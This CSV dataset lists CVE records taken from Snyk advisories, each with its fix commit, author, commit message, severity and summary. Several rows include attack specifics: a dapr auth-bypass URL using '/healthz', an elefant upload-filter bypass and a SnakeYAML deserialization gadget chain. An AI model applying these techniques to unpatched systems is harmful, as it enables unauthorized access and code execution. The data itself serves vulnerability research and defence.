cve_id,cwe_id,source,reference,publish_date,update_date,github_commit_link,vulnerability_types,api_url,author,email,project,commit_id,commit_message,language,score,severity,summary,year
CVE-2023-2430,CWE-413,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5803101,23/07/2023,23/07/2023,https://github.com/torvalds/linux/commit/e12d7a46f65ae4b7d58a5e0c1cbfa825cf8d830d,Improper Resource Locking,https://api.github.com/repos/torvalds/linux/commits/e12d7a46f65ae4b7d58a5e0c1cbfa825cf8d830d,Jens Axboe,axboe@kernel.dk,linux,e12d7a46f65ae4b7d58a5e0c1cbfa825cf8d830d,"io_uring/msg_ring: fix missing lock on overflow for IOPOLL

If the target ring is configured with IOPOLL, then we always need to hold
the target ring uring_lock before posting CQEs. We could just grab it
unconditionally, but since we don't expect many target rings to be of this
type, make grabbing the uring_lock conditional on the ring type.

Link: https://lore.kernel.org/io-uring/Y8krlYa52%2F0YGqkg@ip-172-31-85-199.ec2.internal/
Reported-by: Xingyuan Mo <hdthky0@gmail.com>
Signed-off-by: Jens Axboe <axboe@kernel.dk>",C/C++,5.5,medium,Affected versions of this package are vulnerable to Improper Resource Locking due to a missing lock for IOPOLL flaw in io_cqring_event_overflow() in io_uring.c. This flaw allows a local attacker with user privilege to trigger a Denial of Service threat.,2023
CVE-2023-37916,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKUBEOPERATORKUBEPIINTERNALSERVICEV1USER-5803026,23/07/2023,22/07/2023,https://github.com/1Panel-dev/KubePi/commit/0faa8c2018a265eac9d1d8021afbeeba06d92024,Information Exposure,https://api.github.com/repos/1Panel-dev/KubePi/commits/0faa8c2018a265eac9d1d8021afbeeba06d92024,ssongliu,songlius11@163.com,KubePi,0faa8c2018a265eac9d1d8021afbeeba06d92024,fix: 解决查询用户返回敏感信息的问题,Go,5.3,medium,Affected versions of this package are vulnerable to Information Exposure which can cause a password-leaking hash for any user.,2023
CVE-2023-37916,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKUBEOPERATORKUBEPIINTERNALAPIV1-5803025,23/07/2023,22/07/2023,https://github.com/1Panel-dev/KubePi/commit/0faa8c2018a265eac9d1d8021afbeeba06d92024,Information Exposure,https://api.github.com/repos/1Panel-dev/KubePi/commits/0faa8c2018a265eac9d1d8021afbeeba06d92024,ssongliu,songlius11@163.com,KubePi,0faa8c2018a265eac9d1d8021afbeeba06d92024,fix: 解决查询用户返回敏感信息的问题,Go,5.3,medium,"github.com/KubeOperator/kubepi/internal/api/v1 is a modern K8s panel.
KubePi allows administrators to import multiple Kubernetes clusters and assign permissions for different clusters and namespaces to specified users through permission control. It allows developers to manage and troubleshoot applications running in a Kubernetes cluster, allowing developers to handle the complexities in a Kubernetes cluster better.
Affected versions of this package are vulnerable to Information Exposure which can cause a password-leaking hash for any user.",2023
CVE-2023-37918,CWE-305,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMDAPRDAPRPKG-5803021,23/07/2023,22/07/2023,https://github.com/dapr/dapr/commit/83ca1abb11ffe34211db55dcd36d96b94252827a,Access Restriction Bypass,https://api.github.com/repos/dapr/dapr/commits/83ca1abb11ffe34211db55dcd36d96b94252827a,ItalyPaleAle,43508+ItalyPaleAle@users.noreply.github.com,dapr,83ca1abb11ffe34211db55dcd36d96b94252827a,"Fixed API token authentication bypassed when path contains `/healthz`

The APITokenAuthMiddleware allowed bypassing the check if the path included `/healthz`. An attacker only needed to include `/healthz` in the URL, even the querystring, to bypass the API token check, for example `/v1.0/invoke/myapp/method/something?foo=/healthz`.

Additionally, this was not checking the method of the request, so requests to `POST /healthz` would cause a service invocation to happen.

This fixes the issue by making the check a lot more strict. The API token check can be bypassed only if:

- The path is exactly `/v1.0/healthz` or `/v1.0/healthz/outbound` (slashes are trimmed on each side)
- The method is `GET`

Signed-off-by: ItalyPaleAle <43508+ItalyPaleAle@users.noreply.github.com>",Markdown,6.8,medium,"Affected versions of this package are vulnerable to Access Restriction Bypass that allows bypassing API token authentication, which is used by the Dapr sidecar to authenticate calls coming from the application, with a well-crafted HTTP request.
Note: This vulnerability impacts Dapr users who have configured API token authentication.",2023
CVE-2023-37917,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOM1PANELDEVKUBEPIINTERNALSERVICEV1USER-5803018,23/07/2023,22/07/2023,https://github.com/1Panel-dev/KubePi/commit/98ea2d621196efe92555e9f0d37a22fdba5baeb7,Privilege Escalation,https://api.github.com/repos/1Panel-dev/KubePi/commits/98ea2d621196efe92555e9f0d37a22fdba5baeb7,ssongliu,songlius11@163.com,KubePi,98ea2d621196efe92555e9f0d37a22fdba5baeb7,fix: 解决用户修改存在提权的问题,Go,9.1,critical,"Affected versions of this package are vulnerable to Privilege Escalation. This is exploitable because a normal user have permission to create/update users, allowing them to become admin by editing the isadmin value in the request",2023
CVE-2018-10856,CWE-732,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERSPODMANV4PKGSPEC-5803016,23/07/2023,13/05/2022,https://github.com/projectatomic/libpod/commit/bae80a0b663925ec751ad2784ca32989403cdc24,Incorrect Permission Assignment for Critical Resource,https://api.github.com/repos/projectatomic/libpod/commits/bae80a0b663925ec751ad2784ca32989403cdc24,Daniel J Walsh,dwalsh@redhat.com,libpod,bae80a0b663925ec751ad2784ca32989403cdc24,"Clear all caps, except the bounding set, when --user is specified.

Currently we are giving all caps to users when running with podman run --user,
They should get none by default.  If the command line includes --cap-add, then
we need to run with those capabilties.  Similarly we need to drop caps from
bounding set, if user specifies --cap-drop

Signed-off-by: Daniel J Walsh <dwalsh@redhat.com>

Closes: #851
Approved by: mheon",Go,8.8,high,Affected versions of this package are vulnerable to Incorrect Permission Assignment for Critical Resource which does not drop capabilities when executing a container as a non-root user.,2023
CVE-2018-10856,CWE-732,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERSPODMANPKGSPEC-5803017,23/07/2023,13/05/2022,https://github.com/projectatomic/libpod/commit/bae80a0b663925ec751ad2784ca32989403cdc24,Incorrect Permission Assignment for Critical Resource,https://api.github.com/repos/projectatomic/libpod/commits/bae80a0b663925ec751ad2784ca32989403cdc24,Daniel J Walsh,dwalsh@redhat.com,libpod,bae80a0b663925ec751ad2784ca32989403cdc24,"Clear all caps, except the bounding set, when --user is specified.

Currently we are giving all caps to users when running with podman run --user,
They should get none by default.  If the command line includes --cap-add, then
we need to run with those capabilties.  Similarly we need to drop caps from
bounding set, if user specifies --cap-drop

Signed-off-by: Daniel J Walsh <dwalsh@redhat.com>

Closes: #851
Approved by: mheon",Go,8.8,high,Affected versions of this package are vulnerable to Incorrect Permission Assignment for Critical Resource which does not drop capabilities when executing a container as a non-root user.,2023
CVE-2023-37917,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKUBEOPERATORKUBEPIINTERNALSERVICEV1USER-5803019,23/07/2023,22/07/2023,https://github.com/1Panel-dev/KubePi/commit/98ea2d621196efe92555e9f0d37a22fdba5baeb7,Privilege Escalation,https://api.github.com/repos/1Panel-dev/KubePi/commits/98ea2d621196efe92555e9f0d37a22fdba5baeb7,ssongliu,songlius11@163.com,KubePi,98ea2d621196efe92555e9f0d37a22fdba5baeb7,fix: 解决用户修改存在提权的问题,Go,9.1,critical,"Affected versions of this package are vulnerable to Privilege Escalation. This is exploitable because a normal user have permission to create/update users, allowing them to become admin by editing the isadmin value in the request",2023
CVE-2023-37901,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-INDICO-5803014,23/07/2023,22/07/2023,https://github.com/indico/indico/commit/2ee636d318653fb1ab193803dafbfe3e371d4130,Cross-site Scripting (XSS),https://api.github.com/repos/indico/indico/commits/2ee636d318653fb1ab193803dafbfe3e371d4130,Adrian Moennich,adrian.moennich@cern.ch,indico,2ee636d318653fb1ab193803dafbfe3e371d4130,"Fix XSS in confirmation prompts

Also update some confirmation prompts to not use HTML in the message as
this is no longer supported.",Unknown,4.4,medium,"indico is a conference lifecycle management and meeting/lecture scheduling tool.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via confirmation prompts.
Exploitation requires someone with at least submission privileges (such as a speaker) and then someone else to attempt to delete this content.",2023
CVE-2018-14716,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NYSTUDIO107CRAFTSEOMATIC-5803015,23/07/2023,13/05/2022,https://github.com/nystudio107/craft-seomatic/commit/1e7d1d084ac3a89e7ec70620f2749110508d1ce1,Arbitrary Code Execution,https://api.github.com/repos/nystudio107/craft-seomatic/commits/1e7d1d084ac3a89e7ec70620f2749110508d1ce1,Andrew Welch,andrew@nystudio107.com,craft-seomatic,1e7d1d084ac3a89e7ec70620f2749110508d1ce1,"Changed the way requests that don't match any elements generate the `canonicalUrl`, to avoid potentially executing injected Twig code

Signed-off-by: Andrew Welch <andrew@nystudio107.com>",PHP,7.5,high,"Affected versions of this package are vulnerable to Arbitrary Code Execution. When requests don't match any elements, it incorrectly generate the canonicalUrl.",2023
CVE-2023-3819,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-5803011,23/07/2023,22/07/2023,https://github.com/pimcore/pimcore/commit/0237527b3244d251fa5ecd4912dfe4f8b2125c54,Information Exposure,https://api.github.com/repos/pimcore/pimcore/commits/0237527b3244d251fa5ecd4912dfe4f8b2125c54,robertSt7,104770750+robertSt7@users.noreply.github.com,pimcore,0237527b3244d251fa5ecd4912dfe4f8b2125c54,"Confidential information provided to user with no permissions (#15530)

* Fix: check user permissions

* some optimizations

* Restrict access to /admin/index/statics

* remove unused

---------

Co-authored-by: dvesh3 <divesh.pahuja@pimcore.com>",PHP,7.6,high,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to Information Exposure which allows unauthorized users to obtain sensitive information about the system's runtime environment, features they have no permission to access, etc.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5803012,23/07/2023,22/07/2023,https://github.com/9001/copyparty/commit/0778da6c4d04de870c61f970763a7b619094093c,Cross-site Scripting (XSS),https://api.github.com/repos/9001/copyparty/commits/0778da6c4d04de870c61f970763a7b619094093c,ed,s@ocv.me,copyparty,0778da6c4d04de870c61f970763a7b619094093c,fix GHSA-cw7j-v52w-fp5r: reflected-XSS through /?hc,Python,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via hc parameter.,2023
CVE-2017-9516,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CRAFTCMSCMS-5808445,28/07/2023,17/05/2022,https://github.com/craftcms/cms/commit/06101e5abb6e4a8f1f89946d23561f3265ea0bed,Cross-site Scripting (XSS),https://api.github.com/repos/craftcms/cms/commits/06101e5abb6e4a8f1f89946d23561f3265ea0bed,Brad Bell,brad@pixelandtonic.com,cms,06101e5abb6e4a8f1f89946d23561f3265ea0bed,Craft will now sanitize uploaded SVG files to prevent a potential XSS attack vector.,PHP,5.4,medium,"craftcms/cms is a content management system.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization by uploading a malicious SVG file.",2023
CVE-2023-38489,CWE-613,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GETKIRBYCMS-5808442,28/07/2023,28/07/2023,https://github.com/getkirby/kirby/commit/7a0a2014c69fdb925ea02f30e7793bb50115e931,Insufficient Session Expiration,https://api.github.com/repos/getkirby/kirby/commits/7a0a2014c69fdb925ea02f30e7793bb50115e931,Lukas Bestle,lukas@getkirby.com,kirby,7a0a2014c69fdb925ea02f30e7793bb50115e931,"Invalidate session on password change

https://github.com/getkirby/kirby/security/advisories/GHSA-5mvj-rvp8-rf45",PHP,7.3,high,"Affected versions of this package are vulnerable to Insufficient Session Expiration. This issue allows attackers to stay logged in to a Kirby site on another device even if the logged-in user has since changed their password. Kirby does not invalidate user sessions that were created with a password that was since changed by the user or by a site admin. If a user changed their password to lock out an attacker who was already in possession of the previous password or of a login session on another device or browser, the attacker would not be reliably prevented from accessing the Kirby site as the affected user.
Note:
This issue affects all Kirby sites with user accounts (unless Kirby's API and Panel are disabled in the config). It can only be abused if a Kirby user is logged in on a device or browser that is shared with potentially untrusted users or if an attacker already maliciously used a previous password to log in to a Kirby site as the affected user.",2023
CVE-2017-7391,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DWEEVESMAGMI-5808443,28/07/2023,17/05/2022,https://github.com/dweeves/magmi-git/commit/a9566b141b58bf40a9dd904a74e6efcc225a28a3,Cross-site Scripting (XSS),https://api.github.com/repos/dweeves/magmi-git/commits/a9566b141b58bf40a9dd904a74e6efcc225a28a3,Sebastien Bracquemont,dweeves@gmail.com,magmi-git,a9566b141b58bf40a9dd904a74e6efcc225a28a3,"Merge pull request #525 from bestshow/master

fixed ajax_gettime.php",PHP,6.1,medium,"dweeves/magmi is a Magento Mass Importer
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to insufficient filtration of user-supplied data (prefix) passed to the magmi-git-master/magmi/web/ajax_gettime.php URL.",2023
CVE-2023-38490,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GETKIRBYCMS-5808440,28/07/2023,28/07/2023,https://github.com/getkirby/kirby/commit/277b05662d2b67386f0a0f18323cf68b30e86387,XML External Entity (XXE) Injection,https://api.github.com/repos/getkirby/kirby/commits/277b05662d2b67386f0a0f18323cf68b30e86387,Lukas Bestle,lukas@getkirby.com,kirby,277b05662d2b67386f0a0f18323cf68b30e86387,"Fix XXE vulnerability

https://github.com/getkirby/kirby/security/advisories/GHSA-q386-w6fg-gmgp",PHP,6.8,medium,"Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via the data handler. If the name of the external file can be controlled by an attacker, this becomes a vulnerability that can be abused for various system impacts like the disclosure of internal or confidential data that is stored on the server (arbitrary file disclosure) or to perform network requests on behalf of the server (server-side request forgery, SSRF).
Note:
This issue only affects Kirby sites that use the Xml data handler (e.g. Data::decode($string, 'xml')) or the Xml::parse() method in site or plugin code. The Kirby core does not use any of the affected methods",2023
CVE-2023-38488,CWE-140,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GETKIRBYCMS-5808441,28/07/2023,28/07/2023,https://github.com/getkirby/kirby/commit/a1e0f81c799ddae1af91cf37216f8ded9cb93540,Improper Neutralization,https://api.github.com/repos/getkirby/kirby/commits/a1e0f81c799ddae1af91cf37216f8ded9cb93540,Lukas Bestle,lukas@getkirby.com,kirby,a1e0f81c799ddae1af91cf37216f8ded9cb93540,"Fix KirbyData BOM vulnerability

https://github.com/getkirby/kirby/security/advisories/GHSA-x5mr-p6v4-wp93",PHP,7.1,high,"Affected versions of this package are vulnerable to Improper Neutralization. Attackers with content write access to overwrite content fields that the site developer didn't intend to be modified. In a Kirby site this can be used to alter site content, break site behavior or inject malicious data or code. The exact security risk depends on the field type and usage.Kirby stores content of the site, of pages, files and users in text files by default.
Note:
Kirby sites are not affected if they don't allow write access for untrusted users or visitors.",2023
CVE-2017-8052,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CRAFTCMSCMS-5808439,28/07/2023,17/05/2022,https://github.com/craftcms/cms/commit/f7e57018ff487d1ebbe375f6cb1852f4d79767ff,Cross-site Scripting (XSS),https://api.github.com/repos/craftcms/cms/commits/f7e57018ff487d1ebbe375f6cb1852f4d79767ff,brandonkelly,brandon@pixelandtonic.com,cms,f7e57018ff487d1ebbe375f6cb1852f4d79767ff,Fixed an XSS vulnerability,Markdown,6.1,medium,"craftcms/cms is a content management system.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the src/controllers/TemplatesController.php file.",2023
CVE-2023-38504,CWE-248,Snyk,https://security.snyk.io/vuln/SNYK-JS-SAILS-5808437,28/07/2023,28/07/2023,https://github.com/balderdashy/sails/commit/4a023dc5095a4b30fdc8535f705ed34cd22d2f7d,Uncaught Exception,https://api.github.com/repos/balderdashy/sails/commits/4a023dc5095a4b30fdc8535f705ed34cd22d2f7d,Mike McNeil,mikermcneil@users.noreply.github.com,sails,4a023dc5095a4b30fdc8535f705ed34cd22d2f7d,"Improve virtual request parsing (#7287)

* Improve virtual request parsing

Relevant for socket.io usage, and usage from tests.  (`sails.request()`)

* Update req.js

---------

Co-authored-by: Eric <eashaw@sailsjs.com>",JavaScript,7.5,high,"sails is a framework for building realtime apps, using MVC conventions (based on Express and Socket.io).
Affected versions of this package are vulnerable to Uncaught Exception. An attacker can send a virtual request that will cause the node process to crash.",2023
CVE-2017-13763,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGONOSPROJECT-5808011,27/07/2023,13/05/2022,https://github.com/opennetworkinglab/onos/commit/f7c7f6f229978fe4e78045069a4485504cc108c4,Denial of Service (DoS),https://api.github.com/repos/opennetworkinglab/onos/commits/f7c7f6f229978fe4e78045069a4485504cc108c4,Jordan Halterman,jordan@onlab.us,onos,f7c7f6f229978fe4e78045069a4485504cc108c4,"[ONOS-6401] Implement dynamically computed timeouts for NettyMessagingManager

Change-Id: Ie2673603a2251983c9e0a166020b4feec041e84c",Java,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) due to improper restriction of the amount of memory allocated. The Netty payload size is not limited.,2023
CVE-2023-39153,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGJENKINSCIPLUGINS-5808005,27/07/2023,26/07/2023,https://github.com/jenkinsci/gitlab-oauth-plugin/commit/d5bdf767e6be2efa2e9d8f8cf99b98726bb5f29d,Cross-site Request Forgery (CSRF),https://api.github.com/repos/jenkinsci/gitlab-oauth-plugin/commits/d5bdf767e6be2efa2e9d8f8cf99b98726bb5f29d,Kris Stern,krisstern@outlook.com,gitlab-oauth-plugin,d5bdf767e6be2efa2e9d8f8cf99b98726bb5f29d,SECURITY-2696,Java,4.6,medium,"org.jenkins-ci.plugins:gitlab-oauth is an a plugin for offloading authentication and authorization to GitLab.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) when it does not implement a state parameter in its OAuth flow, a unique and non-guessable value is associated with each authentication request.
This vulnerability allows attackers to trick users into logging in to the attacker’s account.",2023
CVE-2023-3414,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOJENKINSPLUGINS-5808006,27/07/2023,27/07/2023,https://github.com/jenkinsci/servicenow-devops-plugin/commit/67192e24099787ad732b41d581f20714d4253921,Cross-site Request Forgery (CSRF),https://api.github.com/repos/jenkinsci/servicenow-devops-plugin/commits/67192e24099787ad732b41d581f20714d4253921,Bhavani Velivala (ServiceNow),76525147+bhavani-velivala-sn@users.noreply.github.com,servicenow-devops-plugin,67192e24099787ad732b41d581f20714d4253921,DEF0417750: [Security Bug] Credential leakage through SSRF | Open source,Java,6.1,medium,Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF). Exploiting this vulnerability might result in credential leakage.,2023
CVE-2023-3442,CWE-862,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOJENKINSPLUGINS-5808007,27/07/2023,27/07/2023,https://github.com/jenkinsci/servicenow-devops-plugin/commit/67192e24099787ad732b41d581f20714d4253921,Missing Authorization,https://api.github.com/repos/jenkinsci/servicenow-devops-plugin/commits/67192e24099787ad732b41d581f20714d4253921,Bhavani Velivala (ServiceNow),76525147+bhavani-velivala-sn@users.noreply.github.com,servicenow-devops-plugin,67192e24099787ad732b41d581f20714d4253921,DEF0417750: [Security Bug] Credential leakage through SSRF | Open source,Java,7.7,high,Affected versions of this package are vulnerable to Missing Authorization. Exploiting this vulnerability could cause unwanted exposure of sensitive information.,2023
CVE-2017-7532,CWE-269,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5808002,27/07/2023,13/05/2022,https://github.com/moodle/moodle/commit/6e861be6b7d49c5ac4583ae46762a28ede5785ad,Improper Privilege Management,https://api.github.com/repos/moodle/moodle/commits/6e861be6b7d49c5ac4583ae46762a28ede5785ad,Marina Glancy,marina@moodle.com,moodle,6e861be6b7d49c5ac4583ae46762a28ede5785ad,MDL-59409 admin: set admin user in unittest,PHP,6.5,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Improper Privilege Management when course creators can change system's default settings for courses.",2023
CVE-2017-18366,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-INTELLIANTSSUBRION-5808001,27/07/2023,14/05/2022,https://github.com/intelliants/subrion/commit/8c08d7b92a4b7b5820a951d53c24844715439b73,Cross-site Request Forgery (CSRF),https://api.github.com/repos/intelliants/subrion/commits/8c08d7b92a4b7b5820a951d53c24844715439b73,Janur Jangaraev,jjangaraev@intelliants.com,subrion,8c08d7b92a4b7b5820a951d53c24844715439b73,#477,PHP,8.8,high,"intelliants/subrion is an open source php content management system.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) via the blog/delete/ action.",2023
CVE-2018-16974,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ELEFANTCMS-5805410,26/07/2023,14/05/2022,https://github.com/jbroadway/elefant/commit/49ba8cc24e9f009ce30d2c2eb9eefeb9be4ce1d0,Arbitrary File Upload,https://api.github.com/repos/jbroadway/elefant/commits/49ba8cc24e9f009ce30d2c2eb9eefeb9be4ce1d0,lux,john@flipsidexr.com,elefant,49ba8cc24e9f009ce30d2c2eb9eefeb9be4ce1d0,"Fixed filemanager file upload validations, re: #287",PHP,9.8,critical,"Affected versions of this package are vulnerable to Arbitrary File Upload in apps/filemanager/upload/drop.php by using /filemanager/api/rm/.htaccess to remove the .htaccess file, and then using a filename that ends in .php followed by space characters (for bypassing the blacklist).
Exploiting this vulnerability can result in PHP Code Execution.",2023
CVE-2017-7297,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRANCHERRANCHERSERVER-5805408,26/07/2023,13/05/2022,https://github.com/rancher/rancher/commit/66fbd35bce2a3b61c3a0b233f191334741e6cbb5,Improper Access Control,https://api.github.com/repos/rancher/rancher/commits/66fbd35bce2a3b61c3a0b233f191334741e6cbb5,Darren Shepherd,darren@rancher.com,rancher,66fbd35bce2a3b61c3a0b233f191334741e6cbb5,v1.3.5,Unknown,8.3,high,"github.com/rancher/rancher/server is a project that provides a container management platform built for organizations that deploy containers in production.
Affected versions of this package are vulnerable to Improper Access Control allowing authenticated users to disable access control via an API call.",2023
CVE-2018-16387,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ELEFANTCMS-5805405,26/07/2023,14/05/2022,https://github.com/jbroadway/elefant/commit/95e84804135988abe9602f5c3f9842432c095288,Cross-site Request Forgery (CSRF),https://api.github.com/repos/jbroadway/elefant/commits/95e84804135988abe9602f5c3f9842432c095288,lux,john@flipsidexr.com,elefant,95e84804135988abe9602f5c3f9842432c095288,"Added CSRF back onto admin, block, blog, and user forms",PHP,4.3,medium,Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) which allows an attacker to add an account via user/add.,2023
CVE-2023-38647,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEHELIX-5805403,26/07/2023,26/07/2023,https://github.com/apache/helix/commit/09d210fa29b18f3b4de8d32f2369dc2b31f71f43,Deserialization of Untrusted Data,https://api.github.com/repos/apache/helix/commits/09d210fa29b18f3b4de8d32f2369dc2b31f71f43,dependabot[bot],49699333+dependabot[bot]@users.noreply.github.com,helix,09d210fa29b18f3b4de8d32f2369dc2b31f71f43,"Bump snakeyaml from 1.30 to 2.0 in /helix-core (#2398)

Bumps [snakeyaml](https://bitbucket.org/snakeyaml/snakeyaml) from 1.30 to 2.0.
- [Commits](https://bitbucket.org/snakeyaml/snakeyaml/branches/compare/snakeyaml-2.0..snakeyaml-1.30)

---
updated-dependencies:
- dependency-name: org.yaml:snakeyaml
  dependency-type: direct:production
...

Signed-off-by: dependabot[bot] <support@github.com>
Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>",XML,9.8,critical,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker can use SnakeYAML to deserialize java.net.URLClassLoader and make it load a JAR from a specified URL, and then deserialize javax.script.ScriptEngineManager to load code using that ClassLoader. This unbounded deserialization can likely lead to remote code execution.",2023
CVE-2023-38647,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEHELIX-5805404,26/07/2023,26/07/2023,https://github.com/apache/helix/commit/09d210fa29b18f3b4de8d32f2369dc2b31f71f43,Deserialization of Untrusted Data,https://api.github.com/repos/apache/helix/commits/09d210fa29b18f3b4de8d32f2369dc2b31f71f43,dependabot[bot],49699333+dependabot[bot]@users.noreply.github.com,helix,09d210fa29b18f3b4de8d32f2369dc2b31f71f43,"Bump snakeyaml from 1.30 to 2.0 in /helix-core (#2398)

Bumps [snakeyaml](https://bitbucket.org/snakeyaml/snakeyaml) from 1.30 to 2.0.
- [Commits](https://bitbucket.org/snakeyaml/snakeyaml/branches/compare/snakeyaml-2.0..snakeyaml-1.30)

---
updated-dependencies:
- dependency-name: org.yaml:snakeyaml
  dependency-type: direct:production
...

Signed-off-by: dependabot[bot] <support@github.com>
Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>",XML,9.8,critical,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker can use SnakeYAML to deserialize java.net.URLClassLoader and make it load a JAR from a specified URL, and then deserialize javax.script.ScriptEngineManager to load code using that ClassLoader. This unbounded deserialization can likely lead to remote code execution.",2023
CVE-2023-36826,CWE-285,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-SENTRY-5805386,26/07/2023,26/07/2023,https://github.com/getsentry/sentry/commit/e932b15435bf36239431eaa3790a6bcfa47046a9,Improper Authorization,https://api.github.com/repos/getsentry/sentry/commits/e932b15435bf36239431eaa3790a6bcfa47046a9,Arpad Borsos,arpad.borsos@sentry.io,sentry,e932b15435bf36239431eaa3790a6bcfa47046a9,"Restrict file downloads to Project (#49680)

The `debug_files` and `artifact_lookup` endpoint are now restricting
file downloads to the specific project according to the route
parameters.",Python,7.7,high,"Affected versions of this package are vulnerable to Improper Authorization such that an authenticated user can download a debug or artifact bundle from arbitrary organizations and projects with a known bundle ID. 
Note:
The user does not need to be a member of the organization or have permissions on the project.  
Authenticated users who do not have the necessary permissions on the particular project are no longer able to download them. Sentry SaaS users do not need to take any action.",2023
CVE-2023-37895,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEJACKRABBIT-5805384,26/07/2023,25/07/2023,https://github.com/apache/jackrabbit/commit/85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,Deserialization of Untrusted Data,https://api.github.com/repos/apache/jackrabbit/commits/85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,Julian Reschke,reschke@apache.org,jackrabbit,85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,"JCR-4948: core: beanutils leaks dependency to commons-collections in oak-core tests

git-svn-id: https://svn.apache.org/repos/asf/jackrabbit/trunk@1910960 13f79535-47bb-0310-9956-ffa450edef68",Java,9.8,critical,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data via the RMIVersions using the component commons-beanutils, which contains a class that can be used for remote code execution over RMI.",2023
CVE-2023-37895,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEJACKRABBIT-5805383,26/07/2023,25/07/2023,https://github.com/apache/jackrabbit/commit/85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,Deserialization of Untrusted Data,https://api.github.com/repos/apache/jackrabbit/commits/85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,Julian Reschke,reschke@apache.org,jackrabbit,85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,"JCR-4948: core: beanutils leaks dependency to commons-collections in oak-core tests

git-svn-id: https://svn.apache.org/repos/asf/jackrabbit/trunk@1910960 13f79535-47bb-0310-9956-ffa450edef68",Java,9.8,critical,"Affected versions of this package are vulnerable to Deserialization of Untrusted Data via the RMIVersions using the component commons-beanutils, which contains a class that can be used for remote code execution over RMI.",2023
CVE-2023-37895,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEJACKRABBIT-5805385,26/07/2023,25/07/2023,https://github.com/apache/jackrabbit/commit/85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,Deserialization of Untrusted Data,https://api.github.com/repos/apache/jackrabbit/commits/85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,Julian Reschke,reschke@apache.org,jackrabbit,85c99d4894ec9666b4c2dc2b7290a03dbe9ba68b,"JCR-4948: core: beanutils leaks dependency to commons-collections in oak-core tests

git-svn-id: https://svn.apache.org/repos/asf/jackrabbit/trunk@1910960 13f79535-47bb-0310-9956-ffa450edef68",Java,9.8,critical,"org.apache.jackrabbit:jackrabbit-webapp is a Web application that hosts and serves a Jackrabbit content repository.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data via the RMIVersions using the component commons-beanutils, which contains a class that can be used for remote code execution over RMI.",2023
CVE-2023-37902,CWE-252,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-VYPER-5805377,26/07/2023,26/07/2023,https://github.com/vyperlang/vyper/commit/019a37ab98ff53f04fecfadf602b6cd5ac748f7f,Unchecked Return Value,https://api.github.com/repos/vyperlang/vyper/commits/019a37ab98ff53f04fecfadf602b6cd5ac748f7f,Charles Cooper,cooper.charles.m@gmail.com,vyper,019a37ab98ff53f04fecfadf602b6cd5ac748f7f,Merge pull request from GHSA-f5x6-7qgp-jhf3,Python,5.3,medium,"vyper is a Pythonic Smart Contract Language for the EVM.
